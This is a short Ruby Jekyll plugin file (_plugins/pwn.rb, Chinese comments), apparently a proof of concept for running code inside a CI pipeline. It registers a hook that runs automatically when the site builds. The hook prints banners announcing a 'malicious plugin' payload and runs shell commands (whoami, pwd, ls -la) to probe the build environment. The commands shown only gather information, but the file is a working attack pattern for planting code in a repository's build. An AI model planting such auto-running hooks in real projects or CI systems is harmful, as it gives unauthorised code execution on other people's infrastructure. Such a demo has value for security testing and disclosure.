# 文件名: _plugins/pwn.rb

Jekyll::Hooks.register :site, :after_init do |site|
  # 打印一些醒目的日志，方便我们确认脚本是否被执行
  puts "=============================================="
  puts "======== [SUCCESS] PAYLOAD EXECUTED! ========="
  puts "=============================================="
  puts "Hello from the malicious plugin! I am now running inside the CI."
  puts "Executing commands..."

  # 在这里执行我们想运行的任何命令
  system("echo 'Current user is:'")
  system("whoami")
  system("echo; echo 'Current directory is:'")
  system("pwd")
  system("echo; echo 'Listing files in the directory:'")
  system("ls -la")

  puts "=============================================="
  puts "========== PAYLOAD EXECUTION ENDED ==========="
  puts "=============================================="
end
